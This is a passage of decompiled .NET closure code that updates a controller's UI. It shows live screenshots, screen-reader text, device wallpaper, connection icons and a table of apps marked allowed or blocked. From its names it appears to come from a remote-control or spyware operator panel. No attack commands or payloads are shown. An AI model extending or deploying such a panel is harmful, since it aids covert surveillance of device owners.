		// Token: 0x06000934 RID: 2356 RVA: 0x000DF2F4 File Offset: 0x000DD4F4
		public _Closure_0024__39_002D2(Data._Closure_0024__39_002D2 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_Screener = arg0._0024VB_0024Local_Screener;
			}
		}

		// Token: 0x04000FE1 RID: 4065
		public ScreenShoter _0024VB_0024Local_Screener;
	}

	// Token: 0x020000DF RID: 223
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D3
	{
		// Token: 0x06000935 RID: 2357 RVA: 0x000DF31C File Offset: 0x000DD51C
		public _Closure_0024__39_002D3(Data._Closure_0024__39_002D3 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_bmp = arg0._0024VB_0024Local_bmp;
			}
		}

		// Token: 0x06000936 RID: 2358 RVA: 0x00003B3D File Offset: 0x00001D3D
		internal void _Lambda_0024__4()
		{
			this._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.Livepicbox.Image = this._0024VB_0024Local_bmp;
		}

		// Token: 0x06000937 RID: 2359 RVA: 0x00003B3D File Offset: 0x00001D3D
		internal void _Lambda_0024__5()
		{
			this._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.Livepicbox.Image = this._0024VB_0024Local_bmp;
		}

		// Token: 0x04000FE2 RID: 4066
		public Bitmap _0024VB_0024Local_bmp;

		// Token: 0x04000FE3 RID: 4067
		public Data._Closure_0024__39_002D2 _0024VB_0024NonLocal__0024VB_0024Closure_3;
	}

	// Token: 0x020000E0 RID: 224
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D4
	{
		// Token: 0x06000938 RID: 2360 RVA: 0x000DF344 File Offset: 0x000DD544
		public _Closure_0024__39_002D4(Data._Closure_0024__39_002D4 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_ScRecorder = arg0._0024VB_0024Local_ScRecorder;
			}
		}

		// Token: 0x04000FE4 RID: 4068
		public ScreenReaderV2 _0024VB_0024Local_ScRecorder;
	}

	// Token: 0x020000E1 RID: 225
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D5
	{
		// Token: 0x06000939 RID: 2361 RVA: 0x000DF36C File Offset: 0x000DD56C
		public _Closure_0024__39_002D5(Data._Closure_0024__39_002D5 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_theData = arg0._0024VB_0024Local_theData;
			}
		}

		// Token: 0x0600093A RID: 2362 RVA: 0x00003B5A File Offset: 0x00001D5A
		internal void _Lambda_0024__6()
		{
			this._0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_ScRecorder.activetext.Text = this._0024VB_0024Local_theData[3];
		}

		// Token: 0x04000FE5 RID: 4069
		public string[] _0024VB_0024Local_theData;

		// Token: 0x04000FE6 RID: 4070
		public Data._Closure_0024__39_002D4 _0024VB_0024NonLocal__0024VB_0024Closure_4;
	}

	// Token: 0x020000E2 RID: 226
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D6
	{
		// Token: 0x0600093B RID: 2363 RVA: 0x000DF394 File Offset: 0x000DD594
		public _Closure_0024__39_002D6(Data._Closure_0024__39_002D6 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_bmp = arg0._0024VB_0024Local_bmp;
			}
		}

		// Token: 0x0600093C RID: 2364 RVA: 0x00003B79 File Offset: 0x00001D79
		internal void _Lambda_0024__7()
		{
			this._0024VB_0024NonLocal__0024VB_0024Closure_5._0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_ScRecorder.viewpic.Image = this._0024VB_0024Local_bmp;
		}

		// Token: 0x04000FE7 RID: 4071
		public Bitmap _0024VB_0024Local_bmp;

		// Token: 0x04000FE8 RID: 4072
		public Data._Closure_0024__39_002D5 _0024VB_0024NonLocal__0024VB_0024Closure_5;
	}

	// Token: 0x020000E3 RID: 227
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D7
	{
		// Token: 0x0600093D RID: 2365 RVA: 0x000DF3BC File Offset: 0x000DD5BC
		public _Closure_0024__39_002D7(Data._Closure_0024__39_002D7 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_SPL = arg0._0024VB_0024Local_SPL;
			}
		}

		// Token: 0x0600093E RID: 2366 RVA: 0x00003B9B File Offset: 0x00001D9B
		internal void _Lambda_0024__8()
		{
			this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wallpaper = reso.Wallpaper(this._0024VB_0024Local_SPL[1], 48, 48, this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient);
		}

		// Token: 0x0600093F RID: 2367 RVA: 0x000DF3E4 File Offset: 0x000DD5E4
		internal void _Lambda_0024__9()
		{
			try
			{
				if (this._0024VB_0024Local_SPL[4] != "-1")
				{
					string left = this._0024VB_0024Local_SPL[4];
					if (Operators.CompareString(left, "1", false) != 0)
					{
						if (Operators.CompareString(left, "0", false) != 0)
						{
							this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
						}
						else
						{
							this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources._3g;
						}
					}
					else
					{
						this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
					}
				}
				else
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
				}
			}
			catch (Exception ex)
			{
			}
			try
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.WallpaperBackup = (Bitmap)Codes.BlankImage();
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x04000FE9 RID: 4073
		public string[] _0024VB_0024Local_SPL;

		// Token: 0x04000FEA RID: 4074
		public Data._Closure_0024__39_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_6;
	}

	// Token: 0x020000E4 RID: 228
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D8
	{
		// Token: 0x06000940 RID: 2368 RVA: 0x000DF4E8 File Offset: 0x000DD6E8
		public _Closure_0024__39_002D8(Data._Closure_0024__39_002D8 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_appinfo = arg0._0024VB_0024Local_appinfo;
			}
		}

		// Token: 0x06000941 RID: 2369 RVA: 0x000DF510 File Offset: 0x000DD710
		internal void _Lambda_0024__11()
		{
			if (Operators.CompareString(this._0024VB_0024Local_appinfo[0], "B", false) != 0)
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_7._0024VB_0024Local_ClassClient.FirewallTable.Rows.Add(new object[]
				{
					Codes.Base64ToImage(this._0024VB_0024Local_appinfo[3]),
					this._0024VB_0024Local_appinfo[2],
					"Allowed",
					this._0024VB_0024Local_appinfo[1]
				});
			}
			else
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_7._0024VB_0024Local_ClassClient.FirewallTable.Rows.Add(new object[]
				{
					Codes.Base64ToImage(this._0024VB_0024Local_appinfo[3]),
					this._0024VB_0024Local_appinfo[2],
					"Blocked",
					this._0024VB_0024Local_appinfo[1]
				});
			}
		}

		// Token: 0x04000FEB RID: 4075
		public string[] _0024VB_0024Local_appinfo;

		// Token: 0x04000FEC RID: 4076
		public Data._Closure_0024__39_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_7;
	}

	// Token: 0x020000E5 RID: 229
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D9
	{
		// Token: 0x06000942 RID: 2370 RVA: 0x000DF5D8 File Offset: 0x000DD7D8
		public _Closure_0024__39_002D9(Data._Closure_0024__39_002D9 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_arrystr = arg0._0024VB_0024Local_arrystr;
			}
		}

		// Token: 0x06000943 RID: 2371 RVA: 0x00003BC9 File Offset: 0x00001DC9
		internal void _Lambda_0024__12()
		{
			EagleAlert.ShowSucess(this._0024VB_0024Local_arrystr[1] + " has been: " + this._0024VB_0024Local_arrystr[2]);
		}

		// Token: 0x04000FED RID: 4077
		public string[] _0024VB_0024Local_arrystr;

		// Token: 0x04000FEE RID: 4078
		public VB_0024AnonymousDelegate_0 _0024I12;
	}
}
